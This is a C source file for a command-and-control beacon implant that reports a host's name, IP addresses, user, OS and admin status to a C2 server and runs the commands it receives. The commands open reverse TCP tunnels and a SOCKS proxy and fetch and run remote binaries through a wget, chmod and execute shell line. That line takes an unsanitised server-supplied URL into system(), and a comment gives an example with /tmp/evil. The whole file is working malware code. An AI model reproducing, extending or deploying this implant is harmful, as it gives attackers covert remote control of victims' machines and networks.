/**
 * The beacon program is responsible for:
 * - collecting information on the host (hostname, IP addresses,
 *   current user, OS version, Admin account or not),
 * - sending a beacon containing that information in XML format
 *   to the C2 server periodically
 * - receiving and parsing the XML response from the C2 server
 *   containing the commands to be executed by the payload: open/close
 *   TCP tunnel, open/close SSH tunnel, open/close dynamic tunnel,
 *   change beacon interval, execute a task from the Internet.
 * - creating the correct process(s) to execute the command(s).
 *   Only the 'open' commands require new processes to be created,
 *   whereas changing the beacon interval and closing tunnels can be
 *   handled directly by the beacon.
 * - sending back execution information to the C2 server.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <libgen.h>

#include <pwd.h>
#include <sys/utsname.h>
#include <ifaddrs.h>

#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include <signal.h>
#include <wait.h>

#include "beacon.h"
#include "command.h"
#include "colors.h"
#include "utils.h"
#include "ssh.h"
#include "socks.h"

#define RHOST "127.0.0.1"
#define RPORT 8000
#define RPORT_STR "8000"
#define BEACON_RESP_MAX_SIZE 2048

#define ABORT (-1)
#define RETRY_LATER 0
#define OK 1


int timeout = 15;		// seconds


/**********************************************************/
/*                   Creating the beacon                  */
/**********************************************************/

#define MAX_IP_ENTRY_SIZE 64

static int get_ips(char *addrs[], size_t max_addrs)
{
	addrs[0] = NULL;
	struct ifaddrs *ifaddr, *ifa;
	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs");
		return 0;
	}

	int n, i = 0;
	for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
		if (ifa->ifa_addr == NULL)
			continue;

		if (ifa->ifa_addr->sa_family == AF_INET) {	// only ipv4
			char host[NI_MAXHOST];
			int ret = getnameinfo(ifa->ifa_addr,
					      sizeof(struct sockaddr_in),
					      host, NI_MAXHOST,
					      NULL, 0, NI_NUMERICHOST);
			char *address = (ret == 0) ? host : "";
			if (strncmp(address, "127", 3) == 0)	// skip loopback addresses
				continue;

			// Remove interface name
			char *entry = malloc(MAX_IP_ENTRY_SIZE);
			//char *interface = ifa->ifa_name;
			//sprintf(entry, "%s@%s", address, interface);
			sprintf(entry, "%s", address);
			addrs[i] = entry;
			i++;

			if (i > max_addrs)
				break;
		}
	}

	return i;
}

/**
 * Determines whether the given IPv4 address is internal by checking its first
 * two octets. See https://en.wikipedia.org/wiki/Reserved_IP_addresses for a
 * list of private IPv4 addresses.
 *
 * Returns 1 if address is internal, 0 otherwise.
 */
static int is_internal_ip(char *_addr)
{
	int priv = 0;

	int f, s, t, fo;
	sscanf(_addr, "%u.%u.%u.%u", &f, &s, &t, &fo);

#if 0
	/* Copy the IP address to a new buffer, because
	   strtok modifies its argument */
	char addr[16];
	char *at = strchr(_addr, '@');
	int addr_len = (int)(at - _addr);
	strncpy(addr, _addr, addr_len);
	addr[addr_len + 1] = '\0';

	/* Get the first two octets as ints */
	char *fp, *sp;
	fp = strtok(addr, ".");
	sp = strtok(NULL, ".");
	long f = strtol(fp, NULL, 10);
	long s = strtol(sp, NULL, 10);
#endif

	// check if IPv4 is private base on first two numbers
	if (f == 10 || f == 127 ||
	    (f == 100 && s >= 64 && s <= 127) ||
	    (f == 172 && s >= 16 && s <= 31) ||
	    (f == 169 && s == 254) || (f == 192 && s == 168))
		priv = 1;

	return priv;
}

char *get_beacon(void)
{
#define BEACON_MAX_SIZE 1024
#define BEACON_FIELD_MAX_SIZE 128
#define BEACON_MAX_IPS 10

	char *beacon = malloc(BEACON_MAX_SIZE);
	if (beacon == NULL)
		return NULL;

	char *hostname = malloc(BEACON_FIELD_MAX_SIZE);
	char *username = malloc(BEACON_FIELD_MAX_SIZE);
	char *os = malloc(BEACON_FIELD_MAX_SIZE);
	char admin;
	char *ips[BEACON_MAX_IPS];
	struct passwd *pw;
	struct utsname utsn;
	uid_t uid = getuid();
	uid_t euid = geteuid();
	int i, n_ips;

	char *pos = beacon;
	pos = append_buff(pos, "<Beacon>\n");
	pos = append_buff(pos, "\t<Type>HEY</Type>\n");

	if (gethostname(hostname, BEACON_FIELD_MAX_SIZE) == -1) {
		//fprintf(stderr, "gethostname: %s\n", strerror(errno));
		sprintf(hostname, "");
	}
	pos = append_buff(pos, "\t<HostName>%s</HostName>\n", hostname);

	n_ips = get_ips(ips, BEACON_MAX_IPS);
	for (i = 0; i < n_ips; i++) {
		if (is_internal_ip(ips[i])) {
			pos =
			    append_buff(pos,
					"\t<InternalIP>%s</InternalIP>\n",
					ips[i]);
		} else {
			pos =
			    append_buff(pos,
					"\t<ExternalIP>%s</ExternalIP>\n",
					ips[i]);
		}
	}

	if (pw = getpwuid(euid)) {
		sprintf(username, "%s", pw->pw_name);
	} else {
		//fprintf(stderr, "getpwuid: %s\n", strerror(errno));
		sprintf(username, "");
	}
	pos = append_buff(pos, "\t<CurrentUser>%s</CurrentUser>\n", username);

	if (uname(&utsn) == -1) {
		fprintf(stderr, "uname: %s\n", strerror(errno));
		sprintf(os, "");
	} else {
		sprintf(os, "%s %s %s", utsn.sysname, utsn.release, utsn.machine);	// release, version
	}
	pos = append_buff(pos, "\t<OS>%s</OS>\n", os);

	admin = (uid == 0 || euid == 0) ? 'Y' : 'N';
	pos = append_buff(pos, "\t<Admin>%c</Admin>\n", admin);
	pos = append_buff(pos, "</Beacon>\n", os);

	free(hostname);
	free(username);
	free(os);
	for (i = 0; i < n_ips; i++)
		free(ips[i]);

	return beacon;
}

/**********************************************************/
/*                    Sending the beacon                  */
/**********************************************************/

int connect_to_c2(const char *host, int port)
{
	int sockfd;

	/* Set host address and port */
	printf("[*] Setting c2 address and port...");
	struct sockaddr_in serv_addr;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(RPORT);
	if (inet_pton(AF_INET, RHOST, &serv_addr.sin_addr) <= 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Creating socket...");
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	/* Set receive timeout on socket */
	struct timeval tv;
	tv.tv_sec = timeout;
	tv.tv_usec = 0;
	printf("[*] Setting timeout %d seconds...", tv.tv_sec);
	if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
		       sizeof(struct timeval)) == -1) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Connecting to c2 server...");
	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
	    0) {
		printf(RED("failed\n"));
		return RETRY_LATER;
	}
	printf("done\n");

	return sockfd;
}

int send_beacon(int sockfd, char *request, size_t request_len)
{
	if (request == NULL || request_len == 0)
		return ABORT;	/* If no beacon could be retrieved, abort */

	printf("[*] Sending HTTP request to server:\n%s\n", request);

	int numsent;
	char *pos = request;
	while (request_len > 0) {
		numsent = send(sockfd, pos, request_len, 0);
		if (numsent >= 0) {
			request_len -= numsent;
			if (request_len)
				pos += numsent;
		} else {
			printf("[*] Error: %s\n", strerror(errno));
			printf("[*] Could not send beacon, will retry\n");
			printf("[*] Closing socket\n");
			return RETRY_LATER;
		}
	}

	printf("[*] Beacon sent\n");

	return OK;
}

/**********************************************************/
/*                   Receiving the beacon                 */
/**********************************************************/

char *get_beacon_resp(int sockfd)
{
	char *buf = calloc(BEACON_RESP_MAX_SIZE, sizeof(char));
	if (buf == NULL) {
		printf("malloc\n");
		return NULL;
	}

	printf("[*] Waiting for c2 server to reply...");
	fflush(stdout);
	int received = 0;
	int tot_read = 0;
	ssize_t numread = 0;
	char *pos = buf;
	do {
		numread = recv(sockfd, pos, BEACON_RESP_MAX_SIZE - tot_read, 0);
		if (numread > 0) {
			tot_read += numread;
			pos += numread;
			received = 1;
		} else if (numread == 0) {
			printf("received %d bytes\n", tot_read);
		} else if (numread == -1) {
			if (errno == EAGAIN && errno == EWOULDBLOCK) {
				printf(RED("timed out\n"));
			} else {
				printf(RED("error\n"));
			}
		}
	} while (numread > 0);

	return buf;
}

/**********************************************************/
/*                     Parsing the beacon                 */
/**********************************************************/

static char *xml_get_attribute(const char *xml, const char *attr)
{
	char *name_start = strstr(xml, attr);
	size_t name_len = strlen(attr);
	char *value_start = name_start + name_len + 2;	// for '="'
	size_t value_len = 0;
	char *curr;
	for (curr = value_start; *curr != '"'; curr++)
		value_len++;

	char *value = malloc(value_len + 1);	// '\0'
	if (value == NULL) {
		printf("malloc\n");
		return NULL;
	}

	memcpy(value, value_start, value_len);
	value[value_len] = '\0';
	return value;
}

/* returns -1 if a system error occurred (malloc)
   return 0 if the tag wasn't found
   returns 1 if the tag was found
   */
static char *xml_parse_command(const char *xml, struct command *cmd)
{
	char *type;
	char *param;
	int id;

	char *pos = strstr(xml, "command id=\"");
	if (!pos)
		return NULL;

	type = xml_get_attribute(pos, "type");
	param = xml_get_attribute(pos, "param");
	char *id_str = xml_get_attribute(pos, "id");

	/* Should do some sanity checks... */
	cmd->id = (int)strtol(id_str, NULL, 10);
	free(id_str);
	cmd->type = type;
	cmd->param = param;

	/* Return next index to enusure the next call
	   looks past the current command */
	return (pos + 1);
}

static int xml_parse_response(char *response, struct command **cmds)
{
	*cmds = NULL;
	int cmd_num = 0;

	if (response) {
		char *cmds_section = strstr(response, "commands");
		if (!cmds_section) {
			printf("[*] XML does not have a commands section\n");
			return cmd_num;
		}
		printf("[*] Commands section found\n");

		char *pos = cmds_section;
		struct command *last;

		// replace with recursive function?
		while (1) {
			struct command *cmd = calloc(1, sizeof(struct command));

			printf("[*] Fetching command...\n");
			if ((pos = xml_parse_command(pos, cmd)) == NULL) {
				printf("[*] No command found\n");
				break;
			}

			printf("[*] Found command [%d] %s : %s\n",
			       cmd->id, cmd->type, cmd->param);

			if (*cmds == NULL) {
				*cmds = cmd;
			} else {
				last->next = cmd;
			}
			last = cmd;
			cmd_num++;
		}
	}

	return cmd_num;
}

static int exec_command(char *cmd, char *param);

#define EXEC_SUCCESS 1
#define EXEC_FAIL (-1)

static void parse_and_exec(char *beacon_response)
{
	if (!beacon_response)
		return;

	struct command *cmds;
	printf("[*] Parsing beacon response...\n");
	int cmd_num = xml_parse_response(beacon_response, &cmds);
	if (!cmd_num) {
		printf("[*] No commands found\n");
		return;
	}

	printf("[*] Found %d commands\n", cmd_num);

	int i, ret;
	struct command *curr_cmd = cmds;
	for (i = 0; i < cmd_num; i++) {
		printf("[*] Starting execution of command [%d]\n",
		       curr_cmd->id);
		curr_cmd->ret = exec_command(curr_cmd->type, curr_cmd->param);
		printf("[*] Command [%d] status: %s\n", curr_cmd->id,
		       (curr_cmd->ret == EXEC_SUCCESS) ? GREEN("V") : RED("X"));
		curr_cmd = curr_cmd->next;

		// do something with the ret value...
	}

	/* Remember to free all command-related buffers */
	curr_cmd = cmds;
	struct command *next = cmds;
	for (i = 0; i < cmd_num; i++) {
		printf("[*] Freeing memory for command [%d]...\n",
		       curr_cmd->id);
		curr_cmd = next;
		printf("[*] Freeing command type...\n");
		free(curr_cmd->type);
		printf("[*] Freeing command parameter...\n");
		free(curr_cmd->param);
		next = curr_cmd->next;
		printf("[*] Freeing command struct...\n");
		free(curr_cmd);
	}
}

/**********************************************************/
/*                 Executing the commands                 */
/**********************************************************/

#define MAX_ATTR_LEN 128

struct process tcp_tunnel = { 0 };
struct process ssh_tunnel = { 0 };
struct process task = { 0 };
struct process socks_sv = { 0 };


static int exec_socks_server(int lport)
{
	if (lport < 1 || lport > 65535)
		return EXEC_FAIL;

	sigset_t new_mask, old_mask;
	sigemptyset(&new_mask);
	sigaddset(&new_mask, SIGCHLD);
	if (sigprocmask(SIG_BLOCK, &new_mask, &old_mask) == -1) {
		printf(RED("sigprocmask\n"));
	}

	socks_sv.pid = 0;
	socks_sv.is_alive = 0;

	int ret;
	pid_t pid = fork();
	switch (pid) {
	case -1:		/* Error */
		printf(RED("[*] Fork error\n"));
		ret = EXEC_FAIL;
		break;
	case 0:		/* Child, do tunnel */
		ret = start_socks_sv(lport);
		//ret = EXIT_SUCCESS;
		printf(YELLOW("[SOCKS] Execution terminated with status %d\n"),
		       ret);
		_exit(ret);
	default:		/* Parent, go back to execution loop */
		socks_sv.pid = pid;
		socks_sv.is_alive = 1;
		if (sigprocmask(SIG_SETMASK, &old_mask, NULL) == -1) {
			printf(RED("Could not restore signal mask!\n"));
		}
		printf(BLUE("[*] Started SOCKS server\n"));
		ret = EXEC_SUCCESS;	/* SUCC */
	}

	return ret;
}

/* OpenSSH command equivalent:
 * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
 *
 * lport:   port to forward to once tunnel established
 * rport:   port the ssh server will be listening on
 */
static int exec_open_tcp_tunnel(int lport, int rport)
{
	if ((rport < 1 || rport > 65535) || (lport < 1 || lport > 65535))
		return -1;

	sigset_t new_mask, old_mask;
	sigemptyset(&new_mask);
	sigaddset(&new_mask, SIGCHLD);
	if (sigprocmask(SIG_BLOCK, &new_mask, &old_mask) == -1) {
		printf(RED("sigprocmask\n"));
	}

	tcp_tunnel.pid = 0;
	tcp_tunnel.is_alive = 0;

	int ret;
	pid_t pid = fork();
	switch (pid) {
	case -1:		/* Error */
		printf(RED("[*] Fork error\n"));
		ret = -1;
		break;
	case 0:		/* Child, do tunnel */
		ret = do_remote_forwarding(lport, rport);
		printf(YELLOW("[OTCP] Executing terminated with status %d\n"),
		       ret);
		_exit(ret);
	default:		/* Parent, go back to execution loop */
		tcp_tunnel.pid = pid;
		tcp_tunnel.is_alive = 1;
		if (sigprocmask(SIG_SETMASK, &old_mask, NULL) == -1) {
			printf(RED("Could not restore signal mask!\n"));
		}
		printf(BLUE("[*] Remote port forwarding launched\n"));
		ret = 1;	/* SUCC */
		break;
	}

	return ret;
}

static int validate_param(const char *cmd, const char *param)
{
	return 1;
}

static int exec_command(char *cmd, char *param)
{
	int ret = 0;

	if (strcmp(cmd, "SLEP") == 0) {
		/* Update timeout value */
		// if (is_valid_interval(param))
		timeout = (int)strtol(param, NULL, 10);
		printf(GREEN("[*] Timeout set to %d seconds\n"), timeout);
		ret = EXEC_SUCCESS;
	} else if (strcmp(cmd, "OTCP") == 0) {
		/* remote port forwarding: L22C900 */
		// if (is_valid_port_spec(param))
		int lport, rport;
		sscanf(param, "L%dC%d", &lport, &rport);
		printf("[*] Calling do_remote_tunnel(%d, %d)\n", lport, rport);
		ret = exec_open_tcp_tunnel(lport, rport);
		if (ret == EXEC_SUCCESS) {
			printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
			       lport);
		} else {
			printf(RED("[*] Failed to open TCP tunnel\n"));
		}
	} else if (strcmp(cmd, "CTCP") == 0) {
		if (tcp_tunnel.pid != 0) {
			if (tcp_tunnel.is_alive) {
				if (kill(tcp_tunnel.pid, SIGTERM) == -1) {
					printf(RED("Kill failed\n"));
					ret = EXEC_FAIL;
				} else {
					printf(GREEN
					       ("[*] TCP tunnel closed\n"));
					ret = EXEC_SUCCESS;
				}
			}
			tcp_tunnel.pid = 0;
		}
	} else if (strcmp(cmd, "OSSH") == 0) {
		printf(GREEN("[OSSH] Opened SSH tunnel on port X\n"));
		return EXEC_FAIL;
	} else if (strcmp(cmd, "CSSH") == 0) {
		printf(GREEN("[CSSH] SSH tunnel closed\n"));
		return EXEC_FAIL;
	} else if (strcmp(cmd, "ODYN") == 0) {
		// if (is_valid_port_spec())
		int lport, rport;
		sscanf(param, "L%dC%d", &lport, &rport);
		ret = exec_socks_server(lport);
		if (ret == EXEC_SUCCESS) {
			printf(GREEN("[*] Started SOCKS server on port %d\n"),
			       lport);
			ret = exec_open_tcp_tunnel(lport, rport);
			if (ret == EXEC_SUCCESS) {
				printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
				       lport);
				printf(GREEN("[*] Opened dynamic tunnel\n"));
			} else {
				printf(RED("[*] Failed to open TCP tunnel\n"));
			}
		} else {
			printf(RED("[*] Failed to start SOCKS server\n"));
		}
	} else if (strcmp(cmd, "CDYN") == 0) {
		printf(GREEN("[CDYN] Dynamic closed\n"));
		return EXEC_FAIL;
	} else if (strcmp(cmd, "TASK") == 0) {
		// if (is_valid_url(param))
		char *cmd_str = malloc(256);
		if (cmd_str == NULL)
			return EXEC_FAIL;
		char *filename = basename(param);
		// wget -O /tmp/evil http://127.0.0.1/http_client_linux_x64 && chmod u+x /tmp/evil && /tmp/evil
		sprintf(cmd_str,
			"wget -O /tmp/%s %s > /dev/null 2>&1 && chmod u+x /tmp/%s && /tmp/%s > /dev/null 2>&1",
			filename, param, filename, filename);
		printf(GREEN("[TASK] %s\n"), cmd_str);
		ret = system(cmd_str); // replace with fork and exec
		if (ret == -1) {
			/* Child process could not be created or status
			   could not be retrieved */
			ret = EXEC_FAIL;
		} else if (WEXITSTATUS(ret) == 127) {
			ret = EXEC_FAIL;
		} else {
			ret = EXEC_SUCCESS;
		}
		free(cmd_str);
	}

	return ret;
}

/**********************************************************/
/*                          Main                          */
/**********************************************************/

static void handle_sigchld(int sig)
{
	int saved_errno = errno;
	int pid;
	while ((pid = waitpid(-1, 0, WNOHANG)) > 0) {	// Possibly save exit status
		if (pid == tcp_tunnel.pid) {
			tcp_tunnel.is_alive = 0;
		} else if (pid == ssh_tunnel.pid) {
			ssh_tunnel.is_alive = 0;
		} else if (pid == task.pid) {
			task.is_alive = 0;
		}
	}
	errno = saved_errno;
}

static int register_sigchld_handler()
{
	struct sigaction sa;
	sa.sa_handler = &handle_sigchld;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
	if (sigaction(SIGCHLD, &sa, 0) == -1)
		return -1;

	return 0;
}

int main(int argc, char *argv[])
{
	printf("[*] Registering SIGCHLD handler for new process...");
	if (register_sigchld_handler() == -1) {
		printf(RED("failed\n"));
		return -1;
	}
	printf("done\n");

	printf("[*] Acquiring beacon...");
	char *beacon = get_beacon();
	if (beacon == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(GREEN("done:\n") "%s", beacon);

#define HTTP_REQ_MAX_SIZE 2048
	printf("[*] Building HTTP request...");
	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
	if (http_req == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
		"Host: " RHOST ":" RPORT_STR "\r\n"
		"Content-Length: %d\r\n\r\n%s", strlen(beacon), beacon);
	printf(GREEN("done\n"));

	while (1) {
		int sockfd, ret;
		ret = connect_to_c2(RHOST, RPORT);
		if (ret == ABORT) {
			/* We don't have a working socket */
			break;
		} else if (ret == RETRY_LATER) {
			/* We don't have a working socket */
			sleep(timeout);
			continue;
		}
		/* We have a working socket */
		sockfd = ret;

		ret = send_beacon(sockfd, http_req, strlen(http_req));
		if (ret == ABORT) {
			close(sockfd);
			break;
		} else if (ret == RETRY_LATER) {
			close(sockfd);
			printf(YELLOW
			       ("[*] Sleep %d seconds before retrying..."),
			       timeout);
			fflush(stdout);
			sleep(timeout);
			printf("done\n");
		} else {
			char *response = get_beacon_resp(sockfd);
			if (response) {
				printf("[*] Server response:\n%s\n", response);
				printf(BLUE("[*] Preparing execution...\n"));
				parse_and_exec(response);
				printf(BLUE("[*] Resuming main loop\n"));
				free(response);
				sleep(timeout);
			}
		}
	}

	free(beacon);
	free(http_req);

	return 0;
}
